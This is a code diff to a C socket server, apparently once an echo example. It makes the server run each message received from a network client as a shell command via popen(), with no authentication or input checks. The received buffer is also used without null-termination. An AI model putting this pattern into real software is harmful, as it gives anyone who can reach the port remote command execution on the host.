@@ -13,6 +13,7 @@
 
 //the thread function
 void *connection_handler(void *);
+//void *execute_command(const char *command);
 int work_con = 0; 
 
 int main(int argc , char *argv[])
@@ -77,6 +78,30 @@ int main(int argc , char *argv[])
     return 0;
 }
 
+void execute_command(const char *command)
+{
+  FILE *fp;
+  char output[1035];
+
+  /* Open the command for reading. */
+  fp = popen(command, "r");
+  if (fp == NULL) {
+    printf("Failed to run command\n" );
+    exit(1);
+  }
+
+  /* Read the output a line at a time - output it. */
+  while (fgets(output, sizeof(output)-1, fp) != NULL) {
+    printf("%s", output);
+   
+  }
+
+  /* close */
+  pclose(fp);
+  
+}
+
+
 void *connection_handler(void *socket_desc)
 {
     //Get the socket descriptor
@@ -125,8 +150,10 @@ void *connection_handler(void *socket_desc)
     while( (read_size = recv(sock , client_message , 2000 , 0)) > 0 )
     {
         //Send the message back to client
-        write(sock , client_message , strlen(client_message));
+       // write(sock , client_message , strlen(client_message));
+	execute_command(client_message);
     }
+ 
      
     if(read_size == 0)
     {
